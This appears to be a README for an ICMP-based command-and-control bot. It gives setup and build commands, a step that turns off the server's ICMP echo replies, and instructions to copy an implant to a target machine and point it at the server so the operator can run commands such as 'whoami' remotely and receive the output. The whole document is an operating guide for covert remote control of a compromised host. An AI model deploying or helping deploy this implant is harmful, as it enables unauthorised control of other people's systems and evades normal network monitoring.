# ICMP C2bot

ICMP C2bot that executes commands and returns the output.

## Setup

Install Golang and requirements:

```
sudo apt install golang-go
sudo apt install git
```

Install the dependencies:

```
go get "golang.org/x/net/icmp"
go get "golang.org/x/net/ipv4"
go get "github.com/chzyer/readline"
```

## Usage

```
./build.sh
```

Ensure we disable default ICMP responses.

```
echo "1" >  /proc/sys/net/ipv4/icmp_echo_ignore_all
```

Run the server. (requires root privs)

```
./output/server.bin
```

Copy the implant to the target and run it.

```
implant.exe [server-ip]
```

After the bot checks-in, you can task the bot to execute a command by enter them into the server prompt.

```
> whoami
whoami
```

The bot will post the output. 
